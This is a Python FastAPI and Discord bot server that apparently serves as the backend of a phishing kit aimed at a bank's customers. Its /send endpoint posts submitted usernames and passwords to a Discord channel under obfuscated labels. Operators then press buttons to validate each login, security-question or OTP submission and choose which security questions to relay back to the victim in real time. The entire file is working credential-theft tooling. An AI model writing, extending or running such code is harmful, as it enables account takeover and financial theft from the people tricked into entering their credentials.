import asyncio
import json
import os
import certifi
import discord
from fastapi import FastAPI, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

# Usar el bundle de certificados de certifi
os.environ["SSL_CERT_FILE"] = certifi.where()
os.environ["REQUESTS_CA_BUNDLE"] = certifi.where()

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)
app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
bot_task = None


class ConnectionManager:
    def __init__(self):
        self.active_connections: list[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def send_personal_message(self, message: str, websocket: WebSocket):
        await websocket.send_text(message)

    async def broadcast(self, message: str):
        for connection in list(self.active_connections):
            try:
                await connection.send_text(message)
            except Exception:
                self.disconnect(connection)


manager = ConnectionManager()

MAX_BUTTON_SELECTIONS = 2
BUTTON_TIMEOUT_SECONDS = 120
BUTTON_TEXT_PREFIX = "Selecciona una pregunta."
BUTTON_EXPIRE_MESSAGE = f"Los botones son válidos solo por {BUTTON_TIMEOUT_SECONDS} segundos."


QUESTIONS = [
    "¿Cuál es el nombre de su cantante/grupo favorito en la universidad?",
    "¿Cuál es el nombre de su maestro(a) de primer grado de primaria?",
    "¿Cuál es el nombre del bachillerato al que asistió su esposo(a)?",
    "¿Cuáles son los 4 últimos números de la cédula de su esposo(a)?",
    "¿Cuál es el primer nombre del hermano(a) mayor de su esposo(a)?",
    "¿Cuál es el nombre de la asignatura preferida en bachillerato?",
    "¿Cuál es el nombre del hospital donde nació su hijo(a) mayor?",
    "¿Cuál es el nombre del equipo de futbol favorito de su padre?",
    "¿En qué sector/urb. vivía su mejor amigo(a) de bachillerato?",
    "¿Cuál es el apellido de su mejor amigo(a) de bachillerato?",
]


class ValidationButton(discord.ui.Button):
    def __init__(self, label: str, value: bool, manager: ConnectionManager, payload: dict, payload_type: str):
        super().__init__(style=discord.ButtonStyle.success if value else discord.ButtonStyle.danger, label=label)
        self.value = value
        self.manager = manager
        self.payload = payload
        self.payload_type = payload_type

    async def callback(self, interaction: discord.Interaction):
        view = self.view
        if view is None:
            await interaction.response.send_message("Esta interacción ya expiró.", ephemeral=True)
            return

        for item in view.children:
            item.disabled = True

        status_text = "Válido" if self.value else "Inválido"
        await interaction.response.edit_message(content=f"{status_text} seleccionado.", view=view)

        websocket_payload = {
            "event": f"{self.payload_type}_validation",
            "valid": self.value,
            "payload": self.payload,
            "user": str(interaction.user),
            "channel_id": interaction.channel.id if interaction.channel else None,
        }
        await self.manager.broadcast(json.dumps(websocket_payload, ensure_ascii=False))

        if self.value and self.payload_type == "login":
            preguntas_view = PreguntasView(self.manager)
            preguntas_view.message = await interaction.channel.send(
                "Login válido. Ahora selecciona las preguntas:",
                view=preguntas_view,
            )


class ValidationView(discord.ui.View):
    def __init__(self, manager: ConnectionManager, payload: dict, payload_type: str):
        super().__init__(timeout=BUTTON_TIMEOUT_SECONDS)
        self.manager = manager
        self.payload = payload
        self.payload_type = payload_type
        self.message: discord.Message | None = None
        self.add_item(ValidationButton("Válido", True, manager, payload, payload_type))
        self.add_item(ValidationButton("Inválido", False, manager, payload, payload_type))

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        if self.message:
            await self.message.edit(content="Los botones expiran y ya no son válidos.", view=self)


class PreguntaButton(discord.ui.Button):
    def __init__(self, index: int, manager: ConnectionManager, label: str):
        super().__init__(style=discord.ButtonStyle.primary, label=label, custom_id=f"pregunta_{index}")
        self.index = index
        self.manager = manager
        self.question_label = label

    async def callback(self, interaction: discord.Interaction):
        view = self.view
        if view is None:
            await interaction.response.send_message("Esta interacción ya expiró.", ephemeral=True)
            return

        if view.selection_count >= view.max_selections:
            await interaction.response.send_message("No se pueden seleccionar más botones.", ephemeral=True)
            return

        view.selection_count += 1
        await interaction.response.send_message(f"Seleccionaste: {self.question_label}", ephemeral=True)
        websocket_payload = {
            "event": "pregunta_selected",
            "question": self.question_label,
            "user": str(interaction.user),
            "channel_id": interaction.channel.id if interaction.channel else None,
            "selection_number": view.selection_count,
        }
        await self.manager.broadcast(json.dumps(websocket_payload, ensure_ascii=False))

        if view.selection_count >= view.max_selections:
            for item in view.children:
                item.disabled = True
            if view.message:
                await view.message.edit(content="Límite de selecciones alcanzado.", view=view)


class PreguntasView(discord.ui.View):
    def __init__(self, manager: ConnectionManager):
        super().__init__(timeout=BUTTON_TIMEOUT_SECONDS)
        self.manager = manager
        self.selection_count = 0
        self.max_selections = MAX_BUTTON_SELECTIONS
        self.message: discord.Message | None = None
        for index, label in enumerate(QUESTIONS, start=1):
            self.add_item(PreguntaButton(index, manager, label))

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        if self.message:
            await self.message.edit(content="Los botones expiraron y ya no son válidos.", view=self)


@client.event
async def on_ready():
    print(f"Logged in as {client.user}")


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith("$hello"):
        print(f"Received $hello from {message.author} in channel {message.channel.id}: {message.content}")
        await message.channel.send("Hello!")


@app.on_event("startup")
async def startup_event():
    token = os.getenv("DISCORD_TOKEN")
    channel_id = os.getenv("DISCORD_CHANNEL_ID", "618204713082552430")

    if not token:
        raise RuntimeError("Missing DISCORD_TOKEN environment variable")
    if not channel_id:
        raise RuntimeError("Missing DISCORD_CHANNEL_ID environment variable")

    global bot_task
    bot_task = asyncio.create_task(client.start(token))


@app.on_event("shutdown")
async def shutdown_event():
    if client.is_ready():
        await client.close()
    if bot_task:
        bot_task.cancel()


@app.post("/send")
async def send_json(payload: dict):
    if not client.is_ready():
        raise HTTPException(status_code=503, detail="Discord bot is not ready")

    channel_id = os.getenv("DISCORD_CHANNEL_ID")
    try:
        print(f"Attempting to send message to channel ID: {channel_id}")
        channel_id = int(channel_id)
    except (TypeError, ValueError):
        raise HTTPException(status_code=500, detail="Invalid DISCORD_CHANNEL_ID")

    channel = client.get_channel(channel_id)
    if channel is None:
        guild = client.get_guild(channel_id)
        if guild is not None:
            channel = guild.system_channel or next(
                (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages),
                None,
            )
            if channel is None:
                raise HTTPException(status_code=500, detail="No accessible text channel found in the guild")
        else:
            raise HTTPException(status_code=500, detail="Discord channel or guild not found")

    username = payload.get("username", "")
    password = payload.get("password", "")
    message_text = f"💯M3RCAN⚡:\nUS4RXS: {username}\nCL4X: {password}"
    await channel.send(message_text)

    websocket_payload = {
        "event": "json_sent",
        "channel_id": channel_id,
        "payload": payload,
    }
    await manager.broadcast(json.dumps(websocket_payload, ensure_ascii=False))

    payload_type = payload.get("type")
    if payload_type in {"login", "questions", "otp"}:
        validation_view = ValidationView(manager, payload, payload_type)
        validation_view.message = await channel.send(
            f"JSON recibido de tipo '{payload_type}'. Selecciona si es válido o inválido:\nLos botones son válidos solo por {BUTTON_TIMEOUT_SECONDS} segundos.",
            view=validation_view,
        )

    return {"status": "sent", "channel_id": channel_id}


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        await manager.send_personal_message(json.dumps({"event": "connected"}, ensure_ascii=False), websocket)
        while True:
            data = await websocket.receive_text()
            await manager.send_personal_message(json.dumps({"event": "echo", "data": data}, ensure_ascii=False), websocket)
    except WebSocketDisconnect:
        manager.disconnect(websocket)


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)

